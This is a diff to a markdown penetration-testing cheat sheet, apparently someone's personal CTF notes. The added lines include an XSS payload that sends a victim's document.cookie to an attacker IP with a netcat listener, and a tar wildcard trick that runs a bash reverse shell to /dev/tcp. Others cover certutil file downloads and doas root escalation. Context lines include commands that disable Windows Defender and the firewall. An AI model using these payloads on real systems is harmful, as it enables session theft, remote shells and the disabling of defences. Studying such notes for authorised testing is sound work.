@@ -23,6 +23,11 @@
 - [FFUF](https://github.com/ffuf/ffuf)
     - Fuzz sub-domain
         - `ffuf -c -w /usr/share/dnsrecon/subdomains-top1mil-20000.txt -u http://{domain.name}/ -H "Host: FUZZ.{domain.name}" -fs {normal_size}`
+### Front-End
+#### XSS
+- Steal Cookie
+	- `<script>new Image().src="http://{my_ip}:1234/"+document.cookie</script>`
+	- `nc -l 1234`
 ### Server
 #### Apache
 - Default log path
@@ -119,6 +124,7 @@
 	- GET (Powershell)
 		- `wget` , `curl` , `iwr` is alias for `Invoke-WebRequest`
 			- `Invoke-WebRequest http://{my_ip}:{my_port}/{file} -outFile {file_name}`
+        - `certutil -urlcache -f {URL} {File_name}`
 ## Server
 ### Redis
 - Write shell / file
@@ -136,10 +142,15 @@
 ### Software
 - [GTFOBins](https://gtfobins.github.io/)
     - Linux privileges escalation 
-- [PEASS-ng](https://github.com/carlospolop/PEASS-ng) , [LinEnum](https://github.com/rebootuser/LinEnum)
-    - Scan the system to find which can be use for privileges escalation
 - [Pspy](https://github.com/DominicBreuker/pspy)
     - Monitor the process
+#### Enumeration
+Scan the system to find which can be use for privileges escalation
+- [PEASS-ng](https://github.com/carlospolop/PEASS-ng)
+- [LinEnum](https://github.com/rebootuser/LinEnum)
+- [LSE](https://github.com/diego-treitos/linux-smart-enumeration)
+
+
 ### Program Hijack
 #### Python
 - import library priority
@@ -158,12 +169,23 @@
 	- Fake path can contain the shell/reverse shell command fle
 - Find File
     - `find  / -iname {file_name} -print 2>/dev/null`
-`
+	- `du -a 2>/dev/null | grep {file_name}`
+	- `tar cf - $PWD 2>/dev/null | tar tvf - | grep {file_name}`
+### Program
+- `tar` Wildcard
+	- `echo "{bash -c 'bash -i >& /dev/tcp/my_ip/7877 0>&1'}" > shell.sh`
+	- `echo "" > "--checkpoint-action=exec=sh shell.sh"`
+	- `echo "" > --checkpoint=1`
+	- `tar cf archive.tar *`
 ### Capability
 - If the program has some special capability
 	- https://man7.org/linux/man-pages/man7/capabilities.7.html
 	- `CAP_SETUID`
 - Can do with [GTFOBins](https://gtfobins.github.io/)
+###  Doas
+- `doas.conf`
+	- if exist `permit nopass {user} as {root} cmd {binary}`
+	- We can `doas {binary}` and it will run as root
 ### Docker
 - `/.dockerenv`
 	- If exist, probably in docker 
@@ -204,8 +226,7 @@
 	-  `Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet`
 -  Turn off firewall
 	- `Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False`
-### Download File
-- `certutil -urlcache -f {URL} {File_name}`
+
 ## Password Crack
 ### Software
 - Hydra
@@ -226,6 +247,7 @@
         - `john {file} --wordlist={wordlist}`
 - Hashcat
     - Crack hash 
+        - https://hashcat.net/wiki/doku.php?id=example_hashes
 ### Dictionary
 - rockyou.txt
 - https://github.com/danielmiessler/SecLists
@@ -253,8 +275,7 @@
 - exiftool
 
 <!-- todo
+chisel
 
-
-https://github.com/CptGibbon/CVE-2021-3156
-
+XXE
 -->
